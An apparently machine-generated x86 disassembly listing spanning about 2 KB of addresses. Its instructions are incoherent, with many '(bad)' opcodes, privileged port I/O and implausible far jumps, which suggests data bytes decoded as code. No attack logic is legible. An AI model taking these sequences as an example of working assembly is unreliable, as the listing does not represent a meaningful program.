  4153db:	in     al,0xdb
  4153dd:	cmp    al,0xd3
  4153df:	push   esp
  4153e0:	retf   0x50fe
  4153e3:	jae    0x415443
  4153e5:	push   ss
  4153e6:	jl     0x415452
  4153e8:	jnp    0x415403
  4153ea:	shl    DWORD PTR [ebp+0x54],cl
  4153ed:	ret    
  4153ee:	jmp    0xfe310b0
  4153f3:	and    ebx,DWORD PTR [edi+0x7f13cddf]
  4153f9:	jbe    0x415380
  4153fb:	xchg   DWORD PTR [ebp-0x6dc55c3f],ebx
  415401:	gs ds leave 
  415404:	out    dx,eax
  415405:	jp     0x4153a7
  415407:	nop
  415408:	pop    ebx
  415409:	inc    ebx
  41540a:	push   0xffffffcd
  41540c:	pop    edx
  41540d:	mov    esi,0x6d07e1ec
  415412:	push   esi
  415413:	adc    al,0x9a
  415415:	hlt    
  415416:	mov    dh,0x8f
  415418:	fisttp DWORD PTR [edx-0x69770d2]
  41541e:	scas   al,BYTE PTR es:[edi]
  41541f:	or     eax,0x83a0403b
  415424:	add    al,bl
  415426:	mov    edx,DWORD PTR [esp+eiz*8-0x282a2b3c]
  41542d:	cld    
  41542e:	sub    eax,0xb02f0114
  415433:	cmp    al,0xeb
  415435:	and    al,0x45
  415437:	stc    
  415438:	(bad)  
  415439:	aam    0x1a
  41543b:	fld    DWORD PTR [ebx+ebp*2+0x5e]
  41543f:	repnz dec edi
  415441:	gs sub eax,0x894500b7
  415447:	hlt    
  415448:	js     0x4153fc
  41544a:	scas   eax,DWORD PTR es:[edi]
  41544b:	xchg   DWORD PTR [ebx-0x5b],ebx
  41544e:	inc    esp
  41544f:	dec    BYTE PTR ds:0xb5cf2172
  415455:	mov    al,ds:0x5c518a94
  41545a:	push   ss
  41545b:	inc    edx
  41545c:	sub    eax,0x63b75a83
  415461:	imul   ebx,DWORD PTR [esi+0x75],0xffffffe8
  415465:	mov    al,ds:0xdfc7af89
  41546a:	hlt    
  41546b:	(bad)  
  41546c:	push   ds
  41546d:	jns    0x415442
  41546f:	mov    esp,0xa2dd0319
  415474:	call   DWORD PTR [ebp-0x64]
  415477:	clc    
  415478:	or     DWORD PTR [ecx],ebx
  41547a:	adc    ah,bh
  41547c:	pop    eax
  41547d:	push   esi
  41547e:	cwde   
  41547f:	mov    DWORD PTR [ecx+ebx*8],eax
  415482:	fimul  WORD PTR [esi+edx*1+0x6b54775f]
  415489:	inc    ebp
  41548a:	mov    edi,0x64074512
  41548f:	mov    cl,0xbb
  415491:	lods   eax,DWORD PTR ds:[esi]
  415492:	sub    eax,0xc5fff417
  415497:	dec    eax
  415498:	push   ss
  415499:	loope  0x415516
  41549b:	shl    DWORD PTR [edx+0x60],1
  41549e:	ja     0x415490
  4154a0:	in     al,0x6c
  4154a2:	or     DWORD PTR [eax],0x1ed235f
  4154a8:	in     al,dx
  4154a9:	mov    ecx,0xb0c64d5d
  4154ae:	jl     0x41550d
  4154b0:	mov    DWORD PTR [eax+0x4a],edx
  4154b3:	nop
  4154b4:	inc    ecx
  4154b5:	xor    DWORD PTR [edx],edi
  4154b7:	push   cs
  4154b8:	scas   al,BYTE PTR es:[edi]
  4154b9:	xor    al,0xf8
  4154bb:	sbb    DWORD PTR [edx],ebx
  4154bd:	sbb    edi,DWORD PTR [edx+0x2b0fc6e8]
  4154c3:	mov    ecx,0x1029c871
  4154c8:	in     eax,dx
  4154c9:	jp     0x4154f9
  4154cb:	pop    ss
  4154cc:	push   es
  4154cd:	mov    ch,0x6d
  4154cf:	frstpm(287 only) 
  4154d1:	sbb    dh,BYTE PTR [edx-0x5ce1f979]
  4154d7:	(bad)  
  4154d8:	out    dx,al
  4154d9:	push   cs
  4154da:	hlt    
  4154db:	ret    0x37f1
  4154de:	loop   0x4154a4
  4154e0:	and    al,0xd5
  4154e2:	mov    bl,cl
  4154e4:	fbstp  TBYTE PTR [ebp+ebp*8+0x2f5dbc70]
  4154eb:	arpl   WORD PTR [eax-0x18],sp
  4154ee:	gs mov eax,0x703a9936
  4154f4:	out    0xc4,eax
  4154f6:	mov    DWORD PTR [edx-0x13358bae],edi
  4154fc:	xlat   BYTE PTR ds:[ebx]
  4154fd:	test   al,0xfd
  4154ff:	jg     0x41550b
  415501:	ds ss push edx
  415504:	fucomp st(6)
  415506:	add    bl,BYTE PTR ds:0x185fa4b1
  41550c:	mov    bl,0x5f
  41550e:	imul   ebp,DWORD PTR [eax],0x67
  415511:	inc    esp
  415512:	lea    edi,[ecx+ebp*2+0x3a4651bb]
  415519:	add    bl,dl
  41551b:	lea    edx,[ebx]
  41551d:	fidiv  WORD PTR [ebx+0x1a]
  415520:	retf   0xc4d5
  415523:	push   esi
  415524:	cli    
  415525:	xchg   esi,eax
  415526:	adc    bl,BYTE PTR [edi+0x41ce77fc]
  41552c:	adc    DWORD PTR [ebx-0x35],edx
  41552f:	fs retf 0x2f54
  415533:	dec    esi
  415534:	outs   dx,BYTE PTR ds:[esi]
  415535:	int    0xca
  415537:	jb     0x4155a6
  415539:	jb     0x4154f9
  41553b:	mov    bh,0x66
  41553d:	sub    dh,cl
  41553f:	aad    0xb
  415541:	inc    ebx
  415542:	push   0xffffff85
  415544:	inc    ebx
  415545:	inc    ecx
  415546:	sub    edx,DWORD PTR [edi-0x74]
  415549:	add    BYTE PTR [ebx-0x408bbd22],dh
  41554f:	jo     0x4154d2
  415551:	or     DWORD PTR [edi+ebx*4],eax
  415554:	enter  0x8803,0x8d
  415558:	cmp    BYTE PTR [ecx],cl
  41555a:	xchg   ebp,eax
  41555b:	mov    al,ds:0x44850af7
  415560:	ret    
  415561:	push   0xf1ce0e80
  415566:	pop    esi
  415567:	add    DWORD PTR [edi-0x2f],eax
  41556a:	test   eax,0xfd96c3de
  41556f:	lahf   
  415570:	inc    edi
  415571:	fnsave [eax+0x7b75436a]
  415577:	dec    esi
  415578:	out    dx,al
  415579:	push   es
  41557a:	popf   
  41557b:	in     eax,0x61
  41557d:	mov    eax,ebx
  41557f:	inc    edi
  415580:	loope  0x415542
  415582:	mov    ah,BYTE PTR [ecx]
  415584:	out    0xcf,al
  415586:	out    dx,eax
  415587:	in     al,dx
  415588:	out    0x8,al
  41558a:	and    eax,0x9cf0cc8b
  41558f:	xchg   BYTE PTR [esi+0x48],al
  415592:	fbld   TBYTE PTR [esi+edi*8-0x19cfd53a]
  415599:	sbb    edi,DWORD PTR [ebx+0x31d00dbf]
  41559f:	pop    ebx
  4155a0:	mov    ebx,esi
  4155a2:	fwait
  4155a3:	dec    edx
  4155a4:	xchg   edx,eax
  4155a5:	cld    
  4155a6:	stos   BYTE PTR es:[edi],al
  4155a7:	cmc    
  4155a8:	sbb    BYTE PTR [eax-0x3e],al
  4155ab:	xchg   ebx,edi
  4155ad:	call   0x8dc0:0x2e96ffe2
  4155b4:	xlat   BYTE PTR ds:[ebx]
  4155b5:	xor    DWORD PTR [eax],esi
  4155b7:	xchg   esp,eax
  4155b8:	lods   eax,DWORD PTR ds:[esi]
  4155b9:	xchg   edi,ebp
  4155bb:	jge    0x41561b
  4155bd:	mov    ch,0x19
  4155bf:	je     0x4155d5
  4155c1:	push   es
  4155c2:	cwde   
  4155c3:	mov    dh,ah
  4155c5:	mov    esi,0x57ff0980
  4155ca:	cmp    BYTE PTR [esi+0x280e5c9c],bh
  4155d0:	iret   
  4155d1:	(bad)  
  4155d2:	adc    bl,BYTE PTR [edi-0x78]
  4155d5:	into   
  4155d6:	imul   eax,DWORD PTR [ebp+0x7b],0x79bfc91
  4155dd:	out    0xd9,eax
  4155df:	or     BYTE PTR [edx],dh
  4155e1:	jmp    DWORD PTR [ebp-0x33a5aa34]
  4155e7:	leave  
  4155e8:	mov    eax,0xcb24463d
  4155ed:	pop    eax
  4155ee:	push   ebx
  4155ef:	lods   eax,DWORD PTR ds:[esi]
  4155f0:	add    DWORD PTR [ebx-0x58],esi
  4155f3:	cmp    al,0xda
  4155f5:	mov    esp,0x511b3f23
  4155fa:	sbb    eax,0x36140555
  4155ff:	shl    BYTE PTR [ebx+edx*8+0x4e],0x7a
  415604:	jmp    0x76c5:0xdb96c39d
  41560b:	push   ebx
  41560c:	mov    ds:0x9ed1405,al
  415611:	jmp    0x61c9:0xc79cc12d
  415618:	call   0xf75319d1
  41561d:	cmp    BYTE PTR [esi],bh
  41561f:	aad    0xb2
  415621:	aad    0x12
  415623:	or     edx,esi
  415625:	mov    bl,0xb1
  415627:	ret    
  415628:	push   0xe7bba0cf
  41562d:	mov    al,0x9a
  41562f:	mov    bh,0xd7
  415631:	mov    esi,eax
  415633:	popf   
  415634:	sbb    cl,dl
  415636:	ins    DWORD PTR es:[edi],dx
  415637:	add    DWORD PTR [ebx+0x6f],ebx
  41563a:	xor    dh,BYTE PTR [esi+0x7a]
  41563d:	(bad)  
  41563e:	out    dx,eax
  41563f:	dec    ebp
  415640:	lods   eax,DWORD PTR ds:[esi]
  415641:	ss push es
  415643:	xor    dh,BYTE PTR ds:0x3b4ad56
  415649:	mov    al,ds:0x48d6fa60
  41564e:	in     eax,0x74
  415650:	or     esp,ebx
  415652:	stos   BYTE PTR es:[edi],al
  415653:	mov    eax,ds:0x3b866825
  415658:	pop    edx
  415659:	lds    ebx,FWORD PTR [ecx+0x54]
  41565c:	push   eax
  41565d:	add    esp,ebx
  41565f:	inc    eax
  415660:	retf   0xf4f
  415663:	push   esp
  415664:	mov    edx,0xde834a87
  415669:	(bad)  
  41566a:	cs call 0xee6f4f08
  415670:	ret    
  415671:	mov    edx,0xf21657e2
  415676:	test   BYTE PTR [edi+ecx*8-0x640ebd5f],bh
  41567d:	stc    
  41567e:	bnd jne 0x4156e1
  415681:	cmp    eax,0xdc717f03
  415686:	aas    
  415687:	inc    esp
  415688:	loope  0x415700
  41568a:	jg     0x4156b3
  41568c:	jnp    0x4156a4
  41568e:	push   0xffffffb1
  415690:	je     0x41565b
  415692:	repnz iret 
  415694:	cmp    BYTE PTR [edi-0x70],cl
  415697:	imul   esp,DWORD PTR [ecx-0x7f],0xa1268928
  41569e:	inc    edi
  41569f:	pop    ds
  4156a0:	jg     0x41565a
  4156a2:	dec    ebp
  4156a3:	add    DWORD PTR [eax+0x20],esi
  4156a6:	or     al,0x68
  4156a8:	cmp    BYTE PTR [edx],bl
  4156aa:	pop    ss
  4156ab:	adc    eax,0xcad827eb
  4156b0:	inc    edi
  4156b1:	shl    dl,cl
  4156b3:	leave  
  4156b4:	sbb    eax,0xea2e6a7d
  4156b9:	mov    ebp,0x96f610f4
  4156be:	scas   al,BYTE PTR es:[edi]
  4156bf:	sbb    al,0xad
  4156c1:	jecxz  0x41564e
  4156c3:	jl     0x4156f9
  4156c5:	addr16 mov dx,0xa5aa
  4156ca:	scas   al,BYTE PTR es:[edi]
  4156cb:	rol    BYTE PTR ds:0x634dd405,cl
  4156d1:	mov    ecx,0xadb0e01b
  4156d6:	jb     0x415734
  4156d8:	mov    esp,DWORD PTR [edx+ebx*4]
  4156db:	aad    0xf8
  4156dd:	fwait
  4156de:	dec    eax
  4156df:	pop    edi
  4156e0:	dec    ebx
  4156e1:	in     al,0xf9
  4156e3:	push   ds
  4156e4:	xor    BYTE PTR [ecx],cl
  4156e6:	out    0xbc,eax
  4156e8:	(bad)  
  4156e9:	jnp    0x415737
  4156eb:	arpl   WORD PTR [eax+0x532d9336],bp
  4156f1:	test   cl,0xe5
  4156f4:	xor    BYTE PTR [bx+si],ah
  4156f7:	dec    edx
  4156f8:	rcl    BYTE PTR [edi-0x21],cl
  4156fb:	push   ebp
  4156fc:	mov    ebp,0xfcdb5b23
  415701:	xchg   edi,eax
  415702:	adc    DWORD PTR [eax+ecx*2+0x69],ecx
  415706:	ds daa 
  415708:	and    al,0x34
  41570a:	inc    ecx
  41570b:	mov    edx,0x30b6bad2
  415710:	push   ebp
  415711:	fs aam 0x10
  415714:	hlt    
  415715:	retf   
  415716:	int    0xf5
  415718:	jg     0x4156f7
  41571a:	in     al,0xf7
  41571c:	and    al,0xf2
  41571e:	jle    0x41573b
  415720:	jb     0x415708
  415722:	imul   ebx,DWORD PTR [bx+si+0x20],0x56
  415727:	out    0x21,eax
  415729:	sbb    eax,0x6ce6058d
  41572e:	out    dx,eax
  41572f:	icebp  
  415730:	enter  0x5063,0xe
  415734:	enter  0xe769,0x3d
  415738:	push   edi
  415739:	xchg   edx,eax
  41573a:	test   al,0x34
  41573c:	lods   eax,DWORD PTR ds:[esi]
  41573d:	nop
  41573e:	fisubr DWORD PTR [edi]
  415740:	jno    0x4157a1
  415742:	cwde   
  415743:	xchg   ecx,eax
  415744:	xor    dl,BYTE PTR [ebx-0x7392b1b2]
  41574a:	inc    esp
  41574b:	lock and DWORD PTR [ebp+0x6251bb0a],ecx
  415752:	add    eax,0x1bb21eb7
  415757:	in     al,0x18
  415759:	cmp    ecx,DWORD PTR [eax+0x2b0ad5d2]
  41575f:	pop    ebp
  415760:	shl    bl,0x4a
  415763:	test   al,0x55
  415765:	adc    eax,0x15bd6223
  41576a:	sbb    bh,dl
  41576c:	ret    0x563c
  41576f:	sbb    DWORD PTR [esi-0x6491d433],eax
  415775:	enter  0xb5b3,0xdb
  415779:	bound  ebx,QWORD PTR [esi+edx*8-0x3d]
  41577d:	ficom  WORD PTR [esi]
  41577f:	push   edx
  415780:	push   es
  415781:	out    dx,eax
  415782:	ss mov esp,0x3c02ce5b
  415788:	in     eax,0xb
  41578a:	push   esp
  41578b:	add    cl,ch
  41578d:	outs   dx,DWORD PTR ds:[esi]
  41578e:	cmp    BYTE PTR [edx+0x165a408b],ah
  415794:	pop    esp
  415796:	pop    ecx
  415797:	sti    
  415798:	jp     0x4157ca
  41579a:	loope  0x4157a1
  41579c:	jo     0x4157d9
  41579e:	sub    edx,DWORD PTR [edx+edi*1]
  4157a1:	repnz push bx
  4157a4:	mov    bh,BYTE PTR [edx-0x36]
  4157a7:	ret    
  4157a8:	fcomi  st,st(6)
  4157aa:	call   0x1f6b6ba
  4157af:	loope  0x415758
  4157b1:	dec    edi
  4157b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157b3:	retf   0x24db
  4157b6:	dec    edi
  4157b7:	mov    ebx,0x97d97b2d
  4157bc:	stos   BYTE PTR es:[edi],al
  4157bd:	inc    ecx
  4157be:	je     0x415746
  4157c0:	repz in eax,0x95
  4157c3:	jae    0x41581f
  4157c5:	mov    DWORD PTR [edi+0x7a1a945f],ebx
  4157cb:	dec    edx
  4157cc:	jns    0x415796
  4157ce:	enter  0x3226,0xe7
  4157d2:	or     DWORD PTR [edx+0x1],edi
  4157d5:	xchg   DWORD PTR [esi],esp
  4157d7:	mov    dh,0x82
  4157d9:	les    ecx,FWORD PTR [edx-0x35]
  4157dc:	mov    WORD PTR [ebp-0x6ceacea],es
  4157e2:	jnp    0x415840
  4157e4:	mov    dh,0xfe
  4157e6:	jle    0x4157fd
  4157e8:	shl    bl,cl
  4157ea:	inc    DWORD PTR [ecx]
  4157ec:	mov    ch,0x1f
  4157ee:	cmp    al,0x8b
  4157f0:	or     eax,edi
  4157f2:	sbb    ah,ch
  4157f4:	fdivr  QWORD PTR [eax]
  4157f6:	or     eax,0xe571e273
  4157fb:	in     al,dx
  4157fc:	loop   0x4157e2
  4157fe:	pop    esi
  4157ff:	imul   ebp,DWORD PTR [ebx],0xfffffff4
  415802:	ret    0x135b
  415805:	adc    DWORD PTR [ebx-0x14],ecx
  415808:	inc    edi
  415809:	mov    ecx,DWORD PTR [edi+0x65]
  41580c:	icebp  
  41580d:	daa    
  41580e:	cld    
  41580f:	jmp    0x53f5:0x54d715f8
  415816:	xchg   esp,eax
  415817:	mov    al,0xa0
  415819:	stc    
  41581a:	popa   
  41581b:	cld    
  41581c:	push   eax
  41581d:	pop    ecx
  41581e:	nop
  41581f:	cmp    edx,edi
  415821:	ds scas al,BYTE PTR es:[edi]
  415823:	sbb    BYTE PTR [edi+0x7a],bh
  415826:	pop    esi
  415827:	sbb    BYTE PTR [eax+edi*4],dh
  41582a:	test   edx,edi
  41582c:	scas   eax,DWORD PTR es:[edi]
  41582d:	jg     0x41580c
  41582f:	add    eax,esi
  415831:	(bad)  
  415832:	mov    ds:0x61ff3b88,eax
  415837:	mov    ch,0x1f
  415839:	xchg   edi,eax
  41583a:	mov    al,ds:0xa44ae823
  41583f:	test   al,0x7c
  415841:	into   
  415842:	(bad)  
  415843:	pop    ebx
  415844:	pop    ds
  415845:	test   eax,0xf10431a5
  41584a:	fstp   DWORD PTR [esp+eax*2]
  41584d:	mov    cl,0x9b
  41584f:	sbb    BYTE PTR [esi],bh
  415851:	jmp    0xf361:0xd97a341b
  415858:	mov    edi,0xbd6617a4
  41585d:	mov    eax,ds:0xc43bf949
  415862:	cmp    dl,BYTE PTR [eax+ebp*4+0x674c1bd2]
  415869:	or     edi,DWORD PTR [ecx]
  41586b:	repnz mov ah,0x89
  41586e:	call   0x4cae:0x72efff0f
  415875:	sbb    DWORD PTR [edx-0x46784a40],edx
  41587b:	outs   dx,DWORD PTR ds:[esi]
  41587c:	jl     0x41583a
  41587e:	adc    edi,esp
  415880:	sbb    BYTE PTR [eax-0x41],ah
  415883:	adc    ecx,DWORD PTR [ecx]
  415885:	fucom  st(2)
  415887:	xchg   ecx,eax
  415888:	lea    edx,[ecx]
  41588a:	mov    al,ds:0x662ee288
  41588f:	(bad)  
  415890:	mov    al,0x3b
  415892:	pushf  
  415893:	ret    
  415894:	pop    eax
  415895:	sub    ch,BYTE PTR [eax+ebp*1]
  415898:	pop    DWORD PTR [esi]
  41589a:	xor    esi,DWORD PTR [esi+0x77502ef2]
  4158a0:	test   edx,esp
  4158a2:	gs mov ah,0xb0
  4158a5:	inc    esi
  4158a6:	or     ebp,edx
  4158a8:	ret    
  4158a9:	jmp    FWORD PTR [eax-0x2d]
  4158ac:	loopne 0x4158ab
  4158ae:	pop    eax
  4158af:	fimul  DWORD PTR [edi-0x1bb4b961]
  4158b5:	mul    DWORD PTR [edi-0x49]
  4158b8:	mov    bh,0x68
  4158ba:	and    BYTE PTR [esi+0x438d53c6],bl
  4158c0:	xchg   edi,eax
  4158c1:	push   0x46
  4158c3:	lock inc esi
  4158c5:	jno    0x4158d0
  4158c7:	jno    0x415917
  4158c9:	sub    eax,0x9a245222
  4158ce:	scas   eax,DWORD PTR es:[edi]
  4158cf:	mov    BYTE PTR [edx+0x4],ah
  4158d2:	mov    ds:0x8941c2bd,al
  4158d7:	dec    edx
  4158d8:	push   di
  4158da:	sti    
  4158db:	or     al,0x5
  4158dd:	(bad)  
  4158de:	clc    
  4158df:	xor    bl,ah
  4158e1:	out    0x4e,eax
  4158e3:	stc    
  4158e4:	add    cl,cl
  4158e6:	neg    DWORD PTR [esi+0x6972feaf]
  4158ec:	fisubr WORD PTR [edi+ecx*4-0x5d0aff9]
  4158f3:	and    edi,DWORD PTR [ecx+0x2a14497]
  4158f9:	(bad)  
  4158fa:	clc    
  4158fb:	je     0x41596f
  4158fd:	es sub dl,dh
  415900:	rcr    ch,cl
  415902:	popa   
  415903:	mov    fs,WORD PTR [edx]
  415905:	sbb    DWORD PTR [ebx+0xa8c0cff],esp
  41590b:	xchg   ecx,eax
  41590c:	dec    edi
  41590d:	imul   esi,eax,0x22
  415910:	test   BYTE PTR [esi-0x33],0x84
  415914:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415915:	sub    BYTE PTR [ecx-0x73],0x4
  415919:	dec    ebp
  41591a:	cmp    eax,0xbf2868a6
  41591f:	sub    eax,0xfd82a13c
  415924:	popf   
  415925:	sub    dl,dl
  415927:	pop    ds
  415928:	or     BYTE PTR [edx+eiz*8],bh
  41592b:	mov    al,0xc3
  41592d:	pushf  
  41592e:	jl     0x415917
  415930:	daa    
  415931:	out    dx,eax
  415932:	sub    dl,BYTE PTR [ebx-0x7002f6cb]
  415938:	sbb    bl,ah
  41593a:	call   0xb0959684
  41593f:	pop    eax
  415940:	dec    eax
  415941:	fnstenv [ebx]
  415943:	les    esi,FWORD PTR [esi-0x23]
  415946:	cmp    eax,0xd7ebd848
  41594b:	mov    ds:0xe3a66c99,al
  415950:	(bad)  
  415951:	mov    ah,0x34
  415953:	pop    ecx
  415954:	retf   0xd44c
  415957:	mov    bl,0x17
  415959:	jnp    0x41596b
  41595b:	jnp    0x415947
  41595d:	and    cl,BYTE PTR [ecx]
  41595f:	repz push 0x78586fe5
  415965:	gs adc al,0xef
  415968:	pop    ss
  415969:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41596a:	mov    bl,0x98
  41596c:	jecxz  0x41595b
  41596e:	add    al,BYTE PTR [edi+0x3d65be69]
  415974:	push   0xffffffff
  415976:	jp     0x4159bb
  415978:	pop    eax
  415979:	jmp    0x41596c
  41597b:	sbb    al,0x12
  41597d:	outs   dx,DWORD PTR ds:[esi]
  41597e:	call   edi
  415980:	cld    
  415981:	stos   BYTE PTR es:[edi],al
  415982:	popf   
  415983:	leave  
  415984:	adc    al,0xee
  415986:	call   0x1276bd81
  41598b:	mov    eax,ds:0x92329197
  415990:	cmp    eax,0x45dff260
  415995:	pop    edx
  415996:	sub    BYTE PTR [edi-0x41b60189],ch
  41599c:	shr    BYTE PTR [ebp-0x1591dd6c],0x29
  4159a3:	cmp    eax,0x89358876
  4159a8:	sbb    dh,BYTE PTR [esi+0x68965960]
  4159ae:	fwait
  4159af:	add    DWORD PTR [esi+0x3b19a767],0xffffffe3
  4159b6:	sub    BYTE PTR [ebx+0x6fb6d9c3],dh
  4159bc:	fdiv   DWORD PTR [ebx]
  4159be:	xor    al,0x8e
  4159c0:	test   ecx,esi
  4159c2:	int3   
  4159c3:	test   DWORD PTR [eax+0x3],ecx
  4159c6:	aad    0xf3
  4159c8:	cwde   
  4159c9:	je     0x415a35
  4159cb:	mov    al,0x8
  4159cd:	add    eax,0x418364a
  4159d2:	mov    dl,BYTE PTR [esi]
  4159d4:	repz mov edx,0xd7f2c648
  4159da:	retf   0xc8a9
  4159dd:	mov    bl,0x3a
  4159df:	dec    edi
  4159e0:	loop   0x415a12
  4159e2:	adc    BYTE PTR [esi],bl
  4159e4:	out    0x28,eax
  4159e6:	fdivp  st(5),st
  4159e8:	and    eax,0x4106476c
  4159ed:	out    0x2a,al
  4159ef:	mov    edi,0x8c9d655b
  4159f4:	das    
  4159f5:	push   ecx
  4159f6:	push   edi
  4159f7:	pusha  
  4159f8:	or     al,BYTE PTR [ebx+0x250c33fc]
  4159fe:	jmp    0x415a0d
  415a00:	sti    
  415a01:	xchg   DWORD PTR ds:0x9a79bc53,esp
  415a07:	add    BYTE PTR [esi],al
  415a09:	mov    al,ds:0x5b939091
  415a0e:	arpl   WORD PTR [edi-0x6c2ce519],sp
  415a14:	loop   0x4159f6
  415a16:	test   eax,0xedd122a0
  415a1b:	ret    
  415a1c:	lds    edi,FWORD PTR [edx-0x7f53f120]
  415a22:	ins    DWORD PTR es:[edi],dx
  415a23:	repnz push edx
  415a25:	icebp  
  415a26:	jo     0x4159df
  415a28:	push   cs
  415a29:	ins    DWORD PTR es:[edi],dx
  415a2a:	(bad)  
  415a2b:	jmp    0x415a35
  415a2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a2e:	jnp    0x415a79
  415a30:	cmp    bl,0x88
  415a33:	pop    edi
  415a34:	scas   al,BYTE PTR es:[edi]
  415a35:	(bad)  
  415a36:	mov    bl,0x95
  415a38:	inc    esp
  415a39:	rcl    DWORD PTR [esi+0x1f1ce7a6],1
  415a3f:	retf   
  415a40:	neg    BYTE PTR [eax]
  415a42:	cwde   
  415a43:	lahf   
  415a44:	mov    ch,0x13
  415a46:	imul   edi,DWORD PTR [edx],0xfda125f0
  415a4c:	movlps QWORD PTR [edx+0x7a],xmm4
  415a50:	test   BYTE PTR [edx],cl
  415a52:	sub    ch,BYTE PTR [esp+ebp*2-0x2d]
  415a56:	add    BYTE PTR [esi],al
  415a58:	jecxz  0x415a2c
  415a5a:	loop   0x4159fa
  415a5c:	imul   edi,DWORD PTR cs:[ebp+0x4d],0xa212faea
  415a64:	sbb    eax,0x8d19b5e0
  415a69:	outs   dx,DWORD PTR ds:[esi]
  415a6a:	push   edi
  415a6b:	jecxz  0x415a8a
  415a6d:	xchg   ebp,eax
  415a6e:	sub    esi,DWORD PTR [ecx]
  415a70:	clc    
  415a71:	sub    ecx,eax
  415a73:	mov    ebx,DWORD PTR [ecx]
  415a75:	sbb    DWORD PTR [ecx+0x67],esi
  415a78:	jge    0x415a67
  415a7a:	and    eax,0xf0771466
  415a7f:	jle    0x415a2c
  415a81:	stos   BYTE PTR es:[edi],al
  415a82:	test   al,0x52
  415a84:	mov    cs,WORD PTR [ebx-0x24e88d03]
  415a8a:	not    dl
  415a8c:	mov    ecx,0x84be661b
  415a91:	xor    BYTE PTR [edx+0x36],dl
  415a94:	or     al,0x9f
  415a96:	enter  0x1f6e,0x2a
  415a9a:	xor    DWORD PTR [ebx-0x6abf1ba6],esp
  415aa0:	std    
  415aa1:	cmp    eax,0x4737eabf
  415aa6:	neg    DWORD PTR [esp+ecx*2-0x32]
  415aaa:	pop    ecx
  415aab:	mov    ah,0xd0
  415aad:	inc    esp
  415aae:	xor    al,0x29
  415ab0:	xchg   ecx,eax
  415ab1:	aad    0xcc
  415ab3:	sub    al,0x9
  415ab5:	xchg   DWORD PTR [ebx+0x35],edx
  415ab8:	jno    0x415b33
  415aba:	xchg   ebx,eax
  415abb:	jge    0x415b23
  415abd:	clc    
  415abe:	inc    edi
  415abf:	dec    esi
  415ac0:	mov    dl,BYTE PTR [edi]
  415ac2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ac3:	lea    ecx,[ebx+0x14]
  415ac6:	js     0x415a93
  415ac8:	mov    DWORD PTR [ecx-0x512b7064],ebp
  415ace:	mov    ecx,0x8f0c6bb3
  415ad3:	cmp    DWORD PTR [edi],esp
  415ad5:	xlat   BYTE PTR ds:[ebx]
  415ad6:	inc    ecx
  415ad7:	(bad)  
  415ad8:	jg     0x415b34
  415ada:	cmp    DWORD PTR [ebp-0x6d],edx
  415add:	xor    al,0xfe
  415adf:	inc    ebx
  415ae0:	pop    ds
  415ae1:	cmp    dl,cl
  415ae3:	sar    BYTE PTR [edx],0x56
  415ae6:	ins    BYTE PTR es:[edi],dx
  415ae7:	test   eax,0xe2e192c6
  415aec:	sub    ah,dh
  415aee:	dec    edi
  415aef:	push   ss
  415af0:	and    eax,0xc181f1ed
  415af5:	(bad)  
  415af6:	repz dec ebp
  415af8:	(bad)  
  415af9:	in     eax,dx
  415afa:	xchg   ebx,eax
  415afb:	pop    esp
  415afc:	or     cl,bl
  415afe:	xchg   BYTE PTR [ebp-0x3d],ah
  415b01:	inc    esp
  415b02:	imul   ebx,esi,0xcdd21624
  415b08:	iret   
  415b09:	adc    al,0x27
  415b0b:	mov    dl,0xb0
  415b0d:	sub    DWORD PTR [ebp-0x68a07ca7],eax
  415b13:	dec    DWORD PTR [edi]
  415b15:	xor    DWORD PTR [ebp-0x11a28bf],ebx
  415b1b:	sub    eax,0x1e5659db
  415b20:	or     eax,0xa8c9793d
  415b25:	loop   0x415b7f
  415b27:	(bad)  
  415b28:	in     eax,0x6e
  415b2a:	mov    ecx,0xb1cbbfdd
  415b2f:	ret    
  415b30:	add    al,0x87
  415b32:	outs   dx,BYTE PTR ds:[esi]
  415b33:	xchg   edx,eax
  415b34:	retf   0x3324
  415b37:	test   eax,0x816c5c6b
  415b3c:	popa   
  415b3d:	lods   eax,DWORD PTR ds:[esi]
  415b3e:	mov    al,0x4
  415b40:	dec    esi
  415b41:	test   eax,0x1a82ab79
  415b46:	fs mov esi,0x86069519
  415b4c:	imul   ebx,ebp,0x2fe68ffb
  415b52:	mov    WORD PTR [eax-0x402a3ae],?
  415b58:	aam    0x9c
  415b5a:	loope  0x415b3c
  415b5c:	jge    0x415b3c
  415b5e:	cmp    edi,eax
  415b60:	test   DWORD PTR [ecx+edx*1-0x426f7e4e],ecx
  415b67:	push   0x56569d20
  415b6c:	(bad)
  415b70:	xchg   ebx,eax
  415b71:	sbb    DWORD PTR [eax],esi
  415b73:	mov    eax,0xacc61c55
  415b78:	cmp    eax,0xf99bbf11
  415b7d:	dec    ecx
  415b7e:	dec    edx
  415b7f:	bsf    ebx,DWORD PTR [edx]
  415b82:	sbb    BYTE PTR [ecx],ch
  415b84:	xor    cl,BYTE PTR [eax-0x26d80659]
  415b8a:	loopne 0x415b48
  415b8c:	mov    eax,ds:0xa80e21a7
  415b91:	mov    eax,0x315bb79b
  415b96:	cmp    BYTE PTR [edx],ah
  415b98:	xchg   esp,eax
  415b99:	adc    edi,esi
  415b9b:	jb     0x415b2c
  415b9d:	lea    esi,[ecx-0x43]
  415ba0:	jecxz  0x415b88
  415ba2:	aam    0xf6
  415ba4:	mov    al,ds:0x6ce5f206
  415ba9:	and    BYTE PTR [ebx],dh
  415bab:	cmp    al,0x59
  415bad:	or     al,0xde
  415baf:	mov    dh,0xf6
  415bb1:	adc    al,0xb5
  415bb3:	dec    edx
  415bb4:	ret    
  415bb5:	xchg   DWORD PTR [eax+0x40c1e20d],edx
  415bbb:	add    edx,edx
  415bbd:	retf   
  415bbe:	push   esi
  415bbf:	or     al,0x8c
  415bc1:	ins    BYTE PTR es:[edi],dx
  415bc2:	push   0x35d7bca4
  415bc7:	adc    edi,DWORD PTR [esi]
  415bc9:	test   DWORD PTR [ebx-0x5a9e83a1],ebp
  415bcf:	sub    eax,0xad21eee4
  415bd4:	mov    dl,0xb0
  415bd6:	cmp    DWORD PTR [edi+0x14],eax
  415bd9:	cmp    DWORD PTR [edi-0x50],ecx
  415bdc:	inc    ebx
  415bdd:	add    eax,0xf12de048
  415be2:	mov    ebx,0x1d5ee0ab
